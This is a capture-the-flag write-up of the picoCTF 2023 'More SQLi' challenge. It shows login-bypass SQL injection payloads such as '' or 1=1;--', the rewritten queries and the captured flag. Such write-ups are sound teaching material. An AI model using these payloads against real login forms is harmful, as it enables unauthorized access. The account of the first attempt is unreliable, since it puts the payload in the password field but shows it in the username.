
# PICOCTF2023 Challenge: More SQLi

## Challenge Description

Can you find the flag on this website?

- Username: `user`
- Password: `user`

Upon entering these credentials, the site shows the SQL query that it's executing:

```
username: user
password: user
SQL query: SELECT id FROM users WHERE password = 'user' AND username = 'user'
```

## Initial Attempt

The challenge hints at SQL injection (SQLi) as the attack vector. The user tries the following SQL injection payload:

- Username: `user`
- Password: `' or 1=1;--`

This manipulates the SQL query to:

```
username: ' or 1=1;--
password: user
SQL query: SELECT id FROM users WHERE password = 'user' AND username = '' or 1=1;--'
```

The SQL query now returns all users because `1=1` is always true, and the `--` is used to comment out the rest of the query.

## Successful SQL Injection

The user then successfully logs in with the following payload:

- Username: `' OR 1=1;`
- Password: `user`

This input results in a successful login. The user notices that a redirection occurs, with the referer being `http://saturn.picoctf.net:57692/index.php`.

## Finding the Flag

Upon examining the response page in `index.php`, the flag is found:

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
```

The flag is `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}`.

This challenge involves exploiting SQL injection vulnerabilities to manipulate the SQL query and gain unauthorized access to the system, ultimately discovering the flag.

## Conclusion

The challenge demonstrates the importance of validating user inputs and protecting against SQL injection attacks. It also highlights the significance of carefully inspecting responses and analyzing network traffic to discover hidden information, such as the flag in this case.
